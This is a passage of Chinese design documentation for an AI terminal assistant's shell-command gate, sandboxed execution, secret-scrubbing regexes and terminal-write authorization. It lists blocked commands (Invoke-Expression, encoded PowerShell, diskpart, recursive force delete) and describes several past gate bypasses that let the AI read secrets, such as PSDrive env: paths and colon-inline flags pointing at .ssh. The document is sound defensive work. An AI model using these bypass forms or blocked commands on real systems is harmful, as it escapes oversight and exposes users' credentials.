  取舍。② PowerShell stop-parsing token `--%`(之后 %VAR% 按 cmd
  语义无条件展开,静态分析失效)段级 fail-closed —— 挂在所有层
  之前,trusted root 内路径带 `--%` 同拒。③ `Get-FileHash` 继承
  md5/shasum 同级内容 hash oracle 闸(M-sec-3;`-Algorithm` 值不
  误拒,`-Path=` 内联形态补提取)。④ `mount` 从 Windows METADATA
  剔除 —— pwsh 内建别名 `mount` → `New-PSDrive`(建驱动器映射,
  含 UNC/WebDAV,SMB 出站 NTLM 中继面),与 `type` / `find` 例外
  同型;macOS / Linux 的 `mount` 保留不动。**别名原则**:pwsh 内建
  别名一律按目标 cmdlet 的真实语义归类(cat/type → Get-Content 读
  文件、mount → New-PSDrive 建映射),不按名字继承 Unix 同名词的
  归类。TS 镜像同批同步。
  **同日 round-4 收口(PSDrive 限定符 + 冒号内联旗标)**:⑤ PSDrive
  限定符路径逃逸 —— `env:PATH` / `HKLM:\…` / `Variable:HOME` 等多
  字符限定符不是盘符(绝对路径判定只认单字母盘符),旧实现落相对
  路径拼 cwd(cwd==trusted root 时过闸),pwsh 运行时按 PSDrive
  内容读取(环境变量里的 API key 直达 LLM 上下文,实证);
  `resolve_cleaned_for` 在 cwd 拼接前检查首段限定符
  (`[A-Za-z][A-Za-z0-9]*:` 且冒号前长度 >1 → fail-closed),一处
  收口覆盖 METADATA / FILE_READERS / TRUSTED_READ / 下载 / 重定向
  全部层;无误杀论证:`:` 在 Win32 文件名非法、盘符单字母、ADS
  必带文件前缀(无 `.` 的 `name:stream` 被拒是刻意的 fail-closed
  取舍)、URL 形态在路径上下文无意义;Unix flavor 完全不动(冒号
  是 Unix 合法文件名字符)。⑥ PowerShell 冒号内联旗标
  `-Flag:value` 与空格 / `=` 同义 —— 通用提取臂此前只剥 `=` 内联,
  `Get-FileHash -Path:C:\…` / `ls -Path:C:\…\.ssh` 整 token 被当
  普通旗标跳过,内容 oracle 闸与 V7 凭证目录闸同被绕(实证);
  现 `flag_match_name` 对限定 pwsh cmdlet base(get-content / gc /
  type / format-hex / get-filehash / get-childitem / ls / dir / gci)
  在 Windows flavor 下同认 `:` 内联(只认已知吃值/路径旗标,未知
  旗标维持跳过),与 select-string 提取器三形态口径对齐;Unix 命令
  无冒号旗标语义,不受影响。TS 镜像同批同步。
  PowerShell 命令名大小写不敏感:Windows 表
  条目小写存储,查表前 base 归一小写(`table_base_key`)。
  2026-08-24 收尾:METADATA 追加 `Get-Command`(= which 的 pwsh
  语义正解 —— `where` 在 pwsh 里是 `Where-Object` alias,运行时会
  错;`where.exe` 显式形态仍在表内);`table_base_key` 的 Windows
  归一追加**剥结尾 `.exe`**(大小写不敏感,`where.exe` /
  `Get-Content.exe` 与裸名同义命中;**Unix 不剥**,`.exe` 在 Unix
  是合法文件名字符)。剥后缀的 key 只用于查 allowlist/三表,不改变
  实际执行的命令,allowlist 条目全是只读语义,无提权面(评估详见
  policy.rs `table_base_key` 注释)。
- **黑名单 / safety 危险面**:两平台收同一份**全局并集**(不按
  flavor 分)。policy 永久黑名单追加 `iex` / `Invoke-Expression`、
  嵌套 `powershell` / `pwsh`(整条命令名,覆盖 `-enc` /
  `-EncodedCommand` base64 隐匿执行的一切形态)、`cmd /c|/k`、`wsl`、
  `Get|Set-Clipboard`(对齐 `pbpaste`/`pbcopy`)。safety DANGEROUS
  追加 `format <盘符>:`(锚定盘符,避免误杀 `git format-patch`)、
  `diskpart` / `bcdedit` / `reg add|delete` / `Set-ExecutionPolicy` /
  `Stop|Restart-Computer` / `Clear-Disk` / `Remove-Item -Recurse
  -Force`(对齐 `rm -rf`);OPERATION 追加 `Stop|Restart-Process`、
  `Stop|Start|Restart-Service`、`Set|Add-Content` / `Out-File`、
  `New|Rename|Move|Copy-Item`。
- **trusted root 路径归一化**(安全不变量,fail-closed):
  `%USERPROFILE%` 与 `$env:USERPROFILE` 展开(大小写不敏感,其余
  形态不展开即拒);`\` / `/` 统一归一为 `/`;盘符与整个路径比较
  大小写不敏感(NTFS 语义,Unix 保持敏感);UNC(`\\server\share`)
  一律 deny;`..` 逃逸沿用归一化后前缀检查;`.kaya-evil` 类前缀
  误判沿用「精确相等 或 root + `/`」边界检查;**8.3 短名**
  (`KAYA~1`)无法纯字符串判定 —— 以「归一后任何路径段含 `~`
  即拒」收紧兜底(Windows-only 规则,macOS 行为不变)。空设备
  例外按 flavor:Unix `/dev/null`(输入侧加 `/dev/zero` /
  `/dev/urandom`),Windows `NUL` / `$null` —— Windows 形态不并
  进 Unix(`NUL` 在 Unix 是普通文件名,放行会让 `echo x > NUL`
  在 cwd 写盘)。归一化全部做成 flavor 参数纯函数,Windows 用例
  在 macOS host 上全量可测。
- **heredoc / `$(...)` 扫描评估结论**:PowerShell 无 heredoc 语法,
  既有扫描对 PowerShell 命令串**无误报**;`$(` 在 PowerShell 是子
  表达式(执行通道),Layer 0a 继续硬拒;**反引号在 PowerShell 是
  转义符**不是命令替换 —— Windows flavor 不再把反引号当命令替换
  拦截(否则 `Write-Output "a`nb"` 误杀)。漏报面(PowerShell
  here-string `@"..."@`)不强行补,由 allowlist-miss catch-all 兜底。
- **PowerShell 执行形态一律硬拒**(2026-08-24 review,fail-closed):
  Windows flavor 下 Layer 0a 把未加引号的 `(` 与 `$(` 同级硬拒 —
  — `(...)` 分组子表达式与 `@(...)` 数组子表达式都是**先求值再当
  参数**的合法 PowerShell 语法(`Write-Output (Get-Content file)`
  此前绕过整个 gate)。双引号内裸 `(` 是字面量不拦(PowerShell
  双引号只插值 `$(` 与反引号);误杀 `(Get-Date).Year` 类合法形态
  是刻意取舍,内部命令拆成独立调用即可。同批:**`\` 在 PowerShell
  是路径分隔符不是转义符**,命令替换扫描器与重定向扫描器
  (strip_unquoted_redirects)的两字符反斜杠跳过在 Windows flavor
  全部禁用 —— 否则 `C:\$(Get-Clipboard)` 的 `$(`、`Get-Date \>
  out.txt` 的 `\>` 被当转义对吃掉,分别造成任意读 / 任意写
  fail-open。Round 2 起分段器(split_segments)同样禁用跳过:
  `;` / `|` 在 PowerShell 不要求前后空白,`Write-Output x\;Get-
  Content C:\secret` 的 `\;` / `\|` 转义形态曾把整条命令吞成单段
  (base ∈ METADATA 放行,被吞的 reader 永远扫不到),现同样硬拒。
  Unix 行为逐字节不变(zsh 的 `\` 转义语义与裸 `(...)`
  语法错误性质不变)。
- **gate 显式 flavor 化**(2026-08-24 review):`check_run_shell_policy`
  拆出 `check_run_shell_policy_for(command, ctx, flavor)` 薄壳,
  gate 全程(三表 / 查表 key / basename / 命令替换与重定向扫描 /
  trusted read+download / trusted-root 归一)按 flavor 透传,不再
  内部硬编码 `OsFlavor::current()` —— Windows 分支的端到端回归
  测试在 macOS host 上直接可跑,与 TS 镜像矩阵对齐。
- **cmdlet 旗标形态**:路径提取识别 PowerShell 的三种旗标赋值形态
  —— `-Path value`(空格)、`-Path:value`(冒号内联)、`-Path=value`
  (等号内联,2026-08-24 补;此前 `Select-String -Path=C:\secret`
  的 `=` 形态不识别导致路径集为空、被误判 stdin-only 放行,是
  fail-open,已修复并加回归矩阵)。`Get-Content` / `type` /
  `Format-Hex` 的 `-Path=` / `-LiteralPath=` 值同样当路径过
  trusted_root 校验;`-Tail=5` 类「值不是路径」的旗标不误判。
  **旗标前缀缩写**(`-pa` = `-Path`)不识别 —— 按未知旗标跳过,
  由无路径判定(Layer 6 拒)/ allowlist-miss 兜底,属已知残余风险。
- **scrub safe-name**:env-var scrub 的关键词正则(`KEY` / `SECRET`
  / `TOKEN` / `PASSWORD` / …)自 Round-58 起没有 safe-name 白名单
  (旧 deny-list 是死代码已删);Windows 系统变量(`USERPROFILE` /
  `APPDATA` / `PSMODULEPATH` 等)均不含上述关键词,天然不会被
  redact,**无需新增任何条目**。

---

## 6. 第三关:Execute 隔离

源码: `crates/kaya-core/src/llm/tools/run_shell.rs`(stage 3)

AI 调 `run_shell` 时,Rust **独立** spawn 一个 `zsh -f -c <cmd>` 子进程:

- `-f` 抑制 `~/.zshrc` 加载 — 这是**关键**。如果不抑制,用户在 rc 文件
  里定义的 alias `ls='rm -rf $HOME/.cache'` 会被展开,policy 检查的是
  字面命令名(`ls`),但实际执行的是 `rm -rf`。
- **不走用户的 PTY**。完全独立的子进程,失败不影响 xterm 状态。
- **默认 8 秒超时**(`DEFAULT_TIMEOUT_SECS`;用户可经 `run_shell.timeout_secs`
  配置;`du` / `find` / `grep` 等慢扫描命令下限 30s,`SLOW_SCAN_MIN_SECS`)
  + **100KB 输出上限**。超时直接 kill。
- **无网络状态保留**:不像用户在 shell 里累计的 venv / conda / alias,
  AI 的子进程每次都是干净的 zsh — 副作用不污染用户环境。
- **子进程环境 = boot 捕获 + Strict scrubbed 快照,不是裸继承**(round-70):
  app 启动时经 `zsh -l -c 'printenv -0'`(Windows:进程 env)捕获一份
  环境,**逐值过最激进档 scrub**(API key / PEM / 云凭据变成
  `[REDACTED:…]`)后按 KEY=VALUE 逐键注入子进程;快照里没有的键才从
  kaya 父进程继承。这样从 Finder/launchd 启动(最小 env)子进程也能看到
  brew/nvm PATH,而用户 env 里的 secret 不会原样进子进程。IM channel 自
  2026-09-07 起与桌面 chat 共享**同一份**快照(此前 IM 侧为空快照,
  只继承父进程 env,见 §4.6)。

> Windows 移植 Phase 1d(2026-08-24):Windows 上子进程是
> `pwsh/powershell -NoProfile -Command <cmd>`(参数形态由
> `pty::env::shell_exec_args` 按 shell 文件名分派)——`-NoProfile`
> 不加载 `$PROFILE`,与 `-f` 同设计意图;超时杀进程走
> `taskkill /PID <pid> /T /F` 进程树(unix 是 killpg 进程组);
> boot 环境捕获(`capture_user_env`)整体跳过,直接用进程 env
> (Windows GUI 启动无 launchd env 缺失问题)。五道关卡结构不变。
> W1.3(2026-08-25)起 Windows 下 `-Command` 前注入
> `[Console]::OutputEncoding=UTF8` prelude(gate 之后注入,不影响
> policy/safety 语义),管道字节解码加 GBK 兜底(中文系统 native exe
> 本地化输出)。

---

## 7. 第四关:Output Scrub(凭据脱敏)

源码: `crates/kaya-core/src/llm/scrub.rs` + TS mirror
`src/lib/scrubber.ts`

### 7.1 Round-54 (2026-06-25) 三层 Tier 设计

把 ~38 类 secret / PII 模式按"是不是必须不能漏"分成三层(v2.1.10
review R2 对照 gitleaks 常见规则补了 8 类,见 Tier 0 列表末尾):

**Tier 0 — Core(所有档都跑,Minimal / Balanced / Strict 都启用)**

核心 secret,绝不能被档位门控 —— 用户选"strict"(UI 最弱)也
不能漏掉 API key / PEM 私钥。~36 类(v3.0.7 起含 gitleaks 对齐补的
8 条,见 §7.8):

- Provider tokens: AWS(`AKIA[16 chars]` + `AWS_ACCESS_KEY_ID=` /
  `AWS_SECRET_ACCESS_KEY=` 前缀两种形式) / GitHub PAT(4 个子类:
  `ghp_` / `gho_` / `github_pat_` / `(ghu|ghs|ghr)_`) / GitLab PAT
  / Anthropic / OpenAI (`sk-proj-`) / DeepSeek / Moonshot
  (`sk-[32+ chars]`) / Stripe (`sk_live_` / `sk_test_`) / Slack /
  Telegram bot / Tavily (`tvly-[A-Za-z0-9_-]{20,}`) /
  **v2.1.10 review R2 补齐(gitleaks 对齐)**:Slack app-level
  (`xapp-<数字>-…`) / npm (`npm_`+恰好 36 位) / PyPI
  (`pypi-AgEIcHlwaS5vcmc` 固定前缀+50+ 字符) / SendGrid
  (`SG.`+恰好 22+43 两段) / DigitalOcean (`dop_v1_`+恰好 64 位
  小写 hex) / Shopify (`shpat_`+恰好 32 位 hex) / Twilio
  (`SK`+恰好 32 位小写 hex) / 三段式 JWT
  (`eyJ…​.…​.…`,每段 ≥8 字符,类别 `jwt`)
- 通用 `api_key=xxx` 形式 (有 fake-key 过滤: `xxx` / `changeme` /
  `placeholder` 等不误吃)。**2026-08-20 review C3**:值前加可选引号
  `['"]?` —— 旧 `~/.kaya/agent-providers.json` 存 `"api_key": "sk-…"`
  (JSON 形式;该文件 2026-09-10 起由统一模型库取代,key 本身已上收
  keychain,但 `.json.migrated` 残留与各 agent 自己的配置文件仍可能含
  JSON 形式的 key),旧的 `:` 形式正则被 `:` 与值之间的 `"` 阻断,整条 JSON
  值会经 trusted-read `cat` 漏给 LLM。Rust `API_KEY_RE` 与 TS
  `scrubber.ts` 对齐(TS 原本就有 `['"]?`),parity 测试
  `scrubs_api_key_json_quoted_value` 锁两侧。
- Bearer token: 合并了 `Authorization: Bearer eyJ...` 和裸
  `eyJ...eyJ...` 两种形式,统一类别名 `bearer-token`。**v2.1.10
  review R2**:Rust 侧补齐裸 `eyJ…eyJ…` 备选分支(此前 Rust 无此
  形态,裸 JWT 只靠 entropy 兜底拦头段,`.` 切开的 payload /
  signature 段会漏);payload 非 `eyJ` 开头的三段式 JWT 由新增的
  `jwt` 类别兜底(两侧一致)
- URL credentials (http(s)://user:pass@)
- PEM 私钥整块 (BEGIN + body + END,7 种 type 变体)
- DB URL password (`mysql://` / `postgres://` / `mongodb://` /
  `redis://` / `amqp://` / `rabbitmq://` / `sftp://` / `smtp://` 携带
  user:pass@)
- High-entropy fallback (`\b[A-Za-z0-9+=]{20,}\b` + 类多样性 +
  至少 2 个不同字符 + 不是 PEM block + 不是自然语言)

**Tier 1 — Env(balanced + aggressive 跑)**

- `KEY=value` / `export FOO=bar` 模式 (有 `PATH` / `HOME` 等安全
  key 的 deny list,只 redact 真敏感的)
- 云厂商 key: GCP (`AIza[35 chars]`) / Azure (`AccountKey=` + 86-88
  base64) / Alibaba (`LTAI[16+ chars]`)

**Tier 2 — PII(aggressive 档独有)**

- email
- phone (CN `1[3-9]\d{9}` + intl `\+[1-9]\d{6,14}`)
- US SSN (`\d{3}-\d{2}-\d{4}`)
- credit card (过 Luhn 校验才视为真卡,16 位硬件 UUID 不会被误吃)
- id-cn 中国身份证号(17–19 位数字串 + 18 位 X/x 校验位形,整 span 脱敏;round-58 去掉校验和门、round-72 放宽到 17–19 位、2026-07-20 review 修复 Rust 侧 19 位泄漏 + X 校验位同 span)。**注册表顺序:id-cn 在 credit-card 之前**——同串同时过 GB-11643 校验位与 Luhn 时类别判 id-cn,Rust(`tier2_pii`)与 TS(`scrubber.ts` registry)顺序必须一致(两侧各有交集 fixture 锁 `1101052000010100008`;drift → audit-judge category-mismatch)

### 7.2 三档严格度 — 命名是反的(故意的)

| 前端标签 | Rust 端 | 触发范围 |
|---|---|---|
| `aggressive` (默认) | `Strict` | Tier 0 + 1 + 2 |
| `balanced` | `Balanced` | Tier 0 + 1 |
| `strict` | `Minimal` | Tier 0(不再仅跑 high-entropy) |

**high-entropy 永远最后跑(所有档)**:2026-07-20 review 修复前 Rust 把
`scrub_high_entropy` 放在 tier0 **开头**附近(先于具体 pattern),与 TS
镜像(registry 最后一项)优先级相反 → 含 ID 的 20+ 字符长串两侧类别分裂
(Rust `entropy-string` / TS `id-cn`,audit-judge category drift)。现在
Rust 在所有档的 tier 派发**之后**跑 entropy——具体 pattern (id-cn /
provider key 等) 先赢类别,entropy 兜底,两侧逐形状对齐(回归锁:
`crates/kaya-core/tests/id_cn_entropy_mirror.rs` ↔
`scrubber.test.ts` "round-2 mirror parity")。

**Round-54 行为变更(隐私优先)**:

- **默认值改为 `aggressive`**:pre-round-54 的 `Balanced` 默认会让
  PII 漏,违背 privacy-first 定位。CLI / 桌面端 / 未知字符串兜底
  全部跟 `aggressive`。
- **核心 secret 模式在所有档都跑**:pre-round-54 时,`aws-access-key` /
  `private-key` / `bearer-token` / `github-pat-*` / `slack-token`
  在 Rust 端的 `Balanced` 档才启用,`Minimal`(用户"strict")档会
  漏这些 —— TS 端则在 `strict` 档就跑,两端行为不一致。round-54
  把所有核心 secret 提到 Tier 0,统一两边行为。
- **store v18 硬迁移**:桌面端 `localStorage.scrubLevel == "balanced"`
  / `"strict"` 的存量用户被自动升级到 `"aggressive"`(`store.ts`
  v17→v18 迁移 body)。CLI config.toml 显式写过的 `scrub_level` 不
  被覆盖 —— CLI 尊重显式配置,只改默认值。

`scrub.rs::frontend_name_to_scrub_level` 是单一真相源。命名是
**反**的,因为 Rust 端以"严格 = 拦更多"为基准,前端 UI 标签
"aggressive = 拦更多"是用户视角。两边命名合理,反着翻译才一致。
**修改这一对映射时,README / CLAUDE.md / scrub.rs 头注释三处都要改**。

### 7.3 Round-55 (2026-06-26) 跟进 — TS/Rust regex 形态对齐补丁

Round-54 落地后,code review 发现 9 处 TS / Rust pattern 形态不齐。
这一节列出对 §7.1 Tier 设计有强化的补丁。完整 spec + 测试见
`docs/superpowers/specs/2026-06-25-scrub-default-aggressive-design.md` §11。

**对 §7.1 Tier 0 的强化**(都是 Tier 0 直接关系到安全的):

- **`env-var-secret` (Tier 1) 多行匹配**:之前 regex 没有 `m` flag,`^`
  只匹配 input 起头,`printenv` / `env` dump 第 2 行起的 secret
  全部绕过。round-55 加 `m` flag(TS) / `(?m)` (Rust),每一行
  都过扫描 + deny list。`API_KEY=sk_live_xxx\nSECRET_KEY=yyy`
  这种 dump 现在正确 redact。
- **`aws-access-key` 加 `AWS_SECRET_ACCESS_KEY=` 前缀支持**:之前 TS
  regex 只匹配裸 `AKIA[16 chars]` 或 `AWS_ACCESS_KEY_ID=AKIA...`,
  真正的 40-char `AWS_SECRET_ACCESS_KEY=<base64>`(没 AKIA 前缀)
  漏。Rust 端从 round-7 起就有。round-55 TS 端加上。
- **`deepseek-key` 加 `\b` 边界 + `_`/`-` 字符**:之前 TS regex
  `/sk-[A-Za-z0-9]{32,}/` 没有 word boundary,内部带 `-` 的 token
  会漏。Rust 端从 round-7 起就有。round-55 TS 端加上。
- **`password-in-url` 支持空用户名**:`redis://:pass@host`(空
  用户名,Redis 无 ACL 模式)之前漏,现在匹配。
- **11 个 Tier 0 / Tier 1 pattern 加 `\b` 边界**(`githubPat*` /
  `gitlabPat` / `anthropicKey` / `stripeLive/Test` / `slackToken` /
  `gcpApiKey` / `alibabaAccessKey`):被标点(括号 / markdown fence /
  HTML tag)包的 token 之前被错误归类,round-55 加 `\b` 后只匹配
  真正的 token 边界,audit-judge 的 deterministic replay 不再
  报 `category-drift`。
- **`openai-key` 窄化到 `sk-proj-` 前缀**:之前 `/sk-(proj-)?.../`
  把 bare `sk-` 32+ 字符(其实是 deepseek 形状)归到 openai-key 桶,
  audit-judge replay 报 `openai-key` vs Rust `deepseek-key` 漂移。
  round-55 强制 `sk-proj-` 前缀,与 Rust `OPENAI_PROJ_KEY_RE` 对齐。
  **真正的 OpenAI legacy `sk-` key 会落到 deepseek-key 桶**(secret
  仍被 redact,只是分类标签不同 —— 这层 trade-off 在
  `docs/superpowers/specs/2026-06-12-llm-secrets-redaction-design.md`
  Pattern 库表的 `deepseek-key` 一行说明里)。
- **`azure-storage-key` 加 `/i` flag**:小写 `accountkey=`(常见于
  `kubectl get secrets -o yaml` 输出)之前漏,现在匹配。
- **`slack-token` 字符类去掉 `o`**:之前 `[aboprs]` 含 `o`,会误匹
  配不存在的 `xoxo-...` token。Rust 端从一开始就是 `[baprs]`。

**测试强化**(11 个新增 tripwire):

- 9 个 `\b` boundary 回归测试:每个 Tier 0 pattern 各 1 个,锁定
  "被标点包时不归类到具体桶,只走 high-entropy 兜底"
- 1 个 `azure-storage-key lowercase` 回归测试
- 1 个 `slack-token xoxo-` 否定回归测试

**测试覆盖现状**(2026-08-04 重测):

- TS:2457 tests pass(71 spec files)
- Rust:测试按模块持续扩张;隐私关键模块的精确数量见 §11.1

(历史 round 的完整仓库总数容易受新增非隐私测试与已知并行 PTY flake 影响;本节只把 `npm test` 的稳定全量结果和 §11.1 可静态核对的模块数量作为当前基线。)

### 7.4 关键 invariant:整段 PEM 整块 redact

见 §4.3。Rust 用 `once_cell::Lazy<Regex>` 编译一次,7 种类型变体的
BEGIN/END 对作为 alternation。CLI / desktop / audit judge 三处共用
同一份 `ssh_key_regex()` 访问入口(2026-06-23 round-7 dedup),加新类型
时只改一处。

**Round-54 新增**:high-entropy fallback 会跳过 `-----BEGIN ... KEY-----`
整块 (public + private)。公开公钥 body 是 base64 形态(看起来像
高熵),但本就是要公开分享的;私钥 body 已经被 `private-key` 整块
redact,不需要 high-entropy 再吃一次。`PEM_BLOCK_RE`(在 Rust
和 TS 镜像都有)在 `looks_like_token` 之前先 filter 掉所有 PEM span。

### 7.5 Placeholder 格式统一

Rust + TS 两端都输出 `[REDACTED:<category>]`(2026-06-19 后统一),LLM
知道"丢了什么类型",仍能继续推理。Pre-2026-06-19 Rust 端是
`[<category>]`,前端是 `[REDACTED:<category>]`,会导致 conversation
JSON / debug JSONL / UI 显示格式不一致 — 改成统一格式修了这条。

### 7.6 外部 API 工具（round-58, 2026-06-29）

`kaya` 的 LLM 可通过 Tavily 联网搜索和抓取网页（`tavily_search` /
`tavily_extract` 工具）。所有 Tavily 返回的外部内容**默认走用户当前 `scrubLevel`
过滤**（默认 `aggressive` = Tier 0+1+2 全开），避免外部网页中潜在的 API key /
PII / 密码泄露给 LLM。

**不可信假设**：Tavily 返回的内容视为外部不可信输入，即使经过 scrub 也不能保证
100% 干净（regex 抓不到 base64 / 加密 blob）。建议 LLM 引用时人工核对关键事实。

### 7.7 terminal_read(终端输出只读可见,2026-08-09)

chat 的 `terminal_read` 工具可以列出你的终端 tab 并读取指定 tab 最近的输出
(每 tab 64 KiB ring buffer,仅内存,不落盘;采集层去 ANSI 控制序列,并做
最小行覆写模拟——`\r` 覆写当前屏幕行 / `ESC[K` 清到行尾 / `\x08` 退格 /
按终端宽度折行拼接——把 shell 重绘后的回显行还原成真实屏幕上的连续文本,
否则折行重绘会把卡号等 secret 切成碎片绕过脱敏(2026-09-17);全屏 TUI
(vim、AI CLI 等)运行期间,捕获切换为实时屏幕快照——由内置终端模拟器
(vt100)在内存中重建画面,读取的是当前屏幕文本与光标位置,同样仅内存、
不落盘,送达 AI 前与所有工具走同一 scrub 管道)。

- **何时脱敏**:终端文本只在 LLM 调用该工具时、送达 LLM 之前经 `scrub_text`
  过滤——与 run_shell / list_dir 同一管道、同一隐私档位。你在 Settings 调整
  secret redaction level 对它同样生效。
- **cwd 不脱敏**:tab 列表展示每个 tab 的 cwd,属进程元数据(与 run_shell 的
  cwd/trusted_root 同一类别,本就不脱敏),但项目目录**名**本身可能嵌入敏感
  字符串——把秘密放进目录名的用户应当知悉。
- **固有局限**:scrub 基于模式匹配,挡不住所有秘密。在终端进行高敏操作
  (查看私钥、生产凭证等)期间,避免让 AI 读取终端,或临时把档位调到 aggressive。
- **只读边界(默认)**:默认情况下(未授权时)AI 不能向你的终端写入任何内容;
  terminal_read 没有写通道;授权后的写入见下节。

**授权写入(2026-08-16,P1;2026-08-17 加总闸)**:前提是你已打开顶栏的 **coding 模式开关**——它是「驾驶」总闸门,关闭时 `terminal_write` 工具根本不注册,chat 连向终端 AI 发输入的能力都不存在;打开之后,再经你在对话中的授权卡片逐 tab 允许,chat 的 `terminal_write` 工具才可向运行白名单 AI CLI 的 tab 发送输入。授权存内存、绑定 (tab, agent 进程),进程退出或 tab 关闭即失效,app 重启清空。每次授权请求与写入记入本地审计日志(元数据:tab、agent、pid、字节数;外加经 secret 脱敏后、截取前 200 字符的输入预览,key 写入记 null)。识别前台进程在 macOS 上靠 `tcgetpgrp` + `ps` 快照,可精确判定「当前前台进程组」是否为白名单 CLI;Windows(2026-08-26 起)改为 sysinfo 进程快照 + 从该 tab shell 子进程向下做进程树子树匹配(`.exe` 后缀归一,ConPTY 无前台进程组概念,以「会话进程树内存在白名单 CLI」近似——这会把同一 shell 子树内的后台 agent 也判定为可写,是比 macOS 更宽松的安全边界),数据不出本机。R3 加固(2026-08-31):① text 参数含 ESC 等终端控制字符(除 Tab/换行外的 C0/C1)一律 `[safety:control-chars]` 拒——防授权后借 agent 回显/TUI 解析链注入终端控制序列(改窗口标题 / OSC 52 剪贴板等),控制序列只能走受枚举约束的 key 参数;② 结尾换行的提交键 `\r` 与正文隔 500ms 分两次写(paste-burst 兜底会吞连发回车),`\r` 发出前再做一次同标准的前台进程 + 授权复验——500ms 窗口内 agent 退出则 fail closed,回车不会落进普通 shell。④ 授权批准命令 `control_grant_respond` 自 2026-10-08 起要求存在对应的 pending 授权请求(无 pending 直接拒、已授权同指纹幂等放行、deny 不受门约束),WebView 内裸调 IPC 无法凭空自授。

**数字应答写入(interaction_answer,2026-08-16/17)**:terminal_write 之外的第二条「向终端写入」通道。coding 模式下,TUI 审批菜单的数字选项随事件下发;你在 chat 输入框敲菜单序号,即把所选键写回 TUI。仅收个位数字 1-9;Rust 侧四道复验(tab 存活锁内重读 / 前台进程白名单 driving_roster / 按最新屏幕快照重取菜单 / 选项合法)全部通过才写入。它不是 terminal_write 的旁路,不消耗 LLM 驾驶授权——敲数字是你本人的显式动作;LLM 永不代为回答。

**未知 /命令 转发(agent_command,2026-08-18)**:第三条终端写入路径。chat 输入未知 `/命令` 且当前会话已绑定 agent 时,原文转发到该 agent 的终端输入行并回车;绑定是会话级内存态(`store.agentTarget`),不写盘。后端 `run_agent_command` 镜像 interaction_answer 的 fail-closed 复验,`validate_agent_command_text` 拒绝控制字符(含 Unicode 双向/零宽字符 U+202A-202E / U+2066-2069 / U+200B-200F / U+FEFF —— Trojan Source 视觉欺骗面,R3 加固)与超限文本;转发成功记一条 user-input 审计(过 input guard)。

**等待感知与主动汇报**:tab 交互确认提醒的 watcher 为**只读**——只对画面快照做模式匹配,绝不向终端注入输入，摘要出口恒 Strict 脱敏。主动开启 Coding 时，kaya 将本地工作区 Agent 的状态和摘要发送给当前 Chat 模型汇报整体；Agent 空闲或等待决策时合并为低频跟进，并可通过 `terminal_read` 读取最近输入输出。自动汇报的输入与工具输出恒用 Strict，本回合持有独立脱敏配置，不能被其他并行回合降级；独立 `read_only_report` wire 字段让 Rust 在完整工具装配后只保留 `probe_env` / `list_dir` / `terminal_read` / `agent_state` / `agent_report` 五个必要只读工具，未来新增工具默认排除，`run_shell`、`terminal_write`、任务/日程/配置/Agent 变更、记忆写入及非必要网络工具均不在场，记忆兜底写入也关闭。前端对当前只读回合的 schedule/queue/task mutation 事件按 turn 身份再次 fail-closed，伪造事件不能落 store。报告不消费转发绑定，也不替用户回答菜单。Chat 忙时延后；普通 Chat 起跑失败释放容量或有效外部回合结束时显式促评，Coding 自己的 busy/failed 不自触发循环；关闭模式、换会话或手动停止取消尚未发送的报告。普通 busy / status_update、Agent 出现或退出及点击卡片不触发模型；启动恢复持久化开关只回填事实。远程 Agent 不由此调度自动读取，仍遵守独立准入。

**Agent 态势注入(2026-09-23,v2.4.0)**:coding 模式开启、或当前会话已绑定 agent 时,你的消息前可能拼接一段 `[host] 运行中 agent 态势` 块(每个运行中 agent 的忙/闲/等待确认状态、正在做什么的摘要、权限模式、上下文用量、待办条数),随该回合发送给你选用的模型。态势内容全部来自 watcher 事件出口——到达注册表前已经过 output scrub(第四关)与 finalize,信任等级与上文的绑定前缀 / excerpt 注入一致;运行中 agent 状态注册表(`agents/state_registry.rs`)是纯内存结构(`Arc<Mutex<HashMap>>`),不落盘、不含任何密钥面;tab 关闭或 agent 退出后,该条目在 watcher 下一轮对账(约 2 秒)即被标记退出、从快照与态势注入中消失,退出条目 10 分钟后从内存清理。注入按会话做内容指纹去重(指纹只按状态/摘要/权限/上下文/待办等稳定字段计算,「N 分钟前」的分钟滴答不触发重注;内容不变 5 分钟内不重复注入),指纹表同样纯内存。IM 渠道使用同一注册表、同一注入函数与同一去重语义；跨机 peer 回合例外：不注入全机 Agent/任务态势，三个只读工具每次执行前按当前注册表重算允许 tab，读取后范围变化则丢弃结果。

**编程规范注入(methodology.md,2026-09-25)**:`~/.kaya/methodology.md` 是你放在 trusted root 内的自建编程规范文件;总指挥角色段的注入条件满足时(terminal_write 与 agent_state 同在工具表),其内容随 system prompt 原样发给你选用的模型。**注意:注入不经过 output scrub**(与 trusted read 的 `cat` 路径不同——cat 读出仍会过第四关脱敏,system prompt 注入是原样直达),写入该文件前请自行确保不含敏感信息;文件本就在 trusted root 内,注入不扩大 LLM 的可见面。超过 640 字节按 UTF-8 字符边界截断(防大文件挤占 system prompt 预算)。文件不存在或为空时注入内置默认规范(zh/en),与用户文件无涉。

### 7.8 v3.0.7 scrub 加固批次(2026-10-08,四路审计修复,两侧镜像同步)

- **未闭合 PEM 兜底(P1)**:run_shell 的 100KB cap 与 terminal_read 的窗口截断都发生在 scrub **之前**,截断点切进 PEM 时 END 标记丢失、整块正则失配,base64 碎片(<20 字符)会漏出。`scrub_text` 新增截断 PEM 检测:未配对的 `-----BEGIN … PRIVATE KEY-----` 从其位置 redact 到文本尾,未配对的 END redact 文本头到该 END,类别 `private-key-truncated`,Tier 0 紧跟整块匹配之后跑 —— 对所有调用方(run_shell / terminal_read / agent_report / 用户输入 guard)统一生效。截断顺序不可颠倒(scrub 后截断会把 placeholder 切半,且输出上限是硬约束),兜底做在 scrub 内部。
- **entropy 字符类补 `_` `-`(P2)**:此前 `[A-Za-z0-9+=]{20,}` 把 `rk_live_…` / `whsec_…` / `AGE-SECRET-KEY-1…` / Cloudflare token 等下划线/连字符分段 token 切碎漏网。补字符后配三重守卫:含 `-` / `_` 的命中要求三类字符多样性 + 含数字,canonical UUID 显式放行;`/` 仍不收(macOS 路径误伤先例)。同批对照 gitleaks 补 8 条 Tier 0 pattern:`rk_live_` / `rk_test_`(rollbar-token)、`whsec_`(slack-signing-secret)、`AGE-SECRET-KEY-1`(age-secret-key)、`dckr_pat_`(docker-pat)、`ntn_`(notion-token)、`sbp_`(supabase-token)、`lin_api_`(linear-api-key)、Slack webhook URL(slack-webhook-url)。`[REDACTED:…]` placeholder 有边界守卫,防 widening 后的 entropy 二次吞并。**已知取舍(残余误伤面)**:用户自填的「全大写 + 数字 + 连字符」标识符(构建号 / 工单号,如 